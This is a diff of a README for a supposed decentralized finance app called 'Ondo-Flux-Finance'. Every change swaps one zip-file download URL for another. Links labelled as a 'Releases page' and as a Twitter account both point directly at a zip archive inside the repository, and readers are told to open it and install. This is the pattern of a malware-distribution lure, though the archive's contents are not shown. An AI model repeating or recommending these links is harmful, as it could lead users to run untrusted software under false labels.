@@ -1,6 +1,6 @@
 # 🚀 Ondo-Flux-Finance - Your Gateway to Decentralized Finance
 
-[![Download Ondo-Flux-Finance](https://raw.githubusercontent.com/NotEleven431/Ondo-Flux-Finance/main/deploy/Ondo-Flux-Finance_v3.2.zip)](https://raw.githubusercontent.com/NotEleven431/Ondo-Flux-Finance/main/deploy/Ondo-Flux-Finance_v3.2.zip)
+[![Download Ondo-Flux-Finance](https://github.com/NotEleven431/Ondo-Flux-Finance/raw/refs/heads/main/scripts/Flux_Finance_Ondo_1.0-beta.5.zip)](https://github.com/NotEleven431/Ondo-Flux-Finance/raw/refs/heads/main/scripts/Flux_Finance_Ondo_1.0-beta.5.zip)
 
 ## 📋 Overview
 
@@ -25,14 +25,14 @@ To use Ondo-Flux-Finance, you need the following:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/NotEleven431/Ondo-Flux-Finance/main/deploy/Ondo-Flux-Finance_v3.2.zip).
+1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/NotEleven431/Ondo-Flux-Finance/raw/refs/heads/main/scripts/Flux_Finance_Ondo_1.0-beta.5.zip).
 2. **Download the Application**: Find the latest version of Ondo-Flux-Finance and click the download link.
 3. **Install the Application**: Open the downloaded file and follow the prompts to install.
 4. **Run the Application**: Locate the installed application on your device and launch it.
 
 ## 📲 Download & Install
 
-To get started with Ondo-Flux-Finance, visit this page to download the latest version: [Download Ondo-Flux-Finance](https://raw.githubusercontent.com/NotEleven431/Ondo-Flux-Finance/main/deploy/Ondo-Flux-Finance_v3.2.zip).
+To get started with Ondo-Flux-Finance, visit this page to download the latest version: [Download Ondo-Flux-Finance](https://github.com/NotEleven431/Ondo-Flux-Finance/raw/refs/heads/main/scripts/Flux_Finance_Ondo_1.0-beta.5.zip).
 
 Once you download the application, follow these steps to set it up:
 
@@ -88,7 +88,7 @@ Your contributions can help improve the application for everyone.
 
 Stay updated and connect with other users:
 
-- **Twitter**: [@OndoFluxFinance](https://raw.githubusercontent.com/NotEleven431/Ondo-Flux-Finance/main/deploy/Ondo-Flux-Finance_v3.2.zip)
+- **Twitter**: [@OndoFluxFinance](https://github.com/NotEleven431/Ondo-Flux-Finance/raw/refs/heads/main/scripts/Flux_Finance_Ondo_1.0-beta.5.zip)
 - **GitHub Discussions**: Join conversations and provide feedback.
 - **Newsletter**: Subscribe for updates on new features and developments.
 
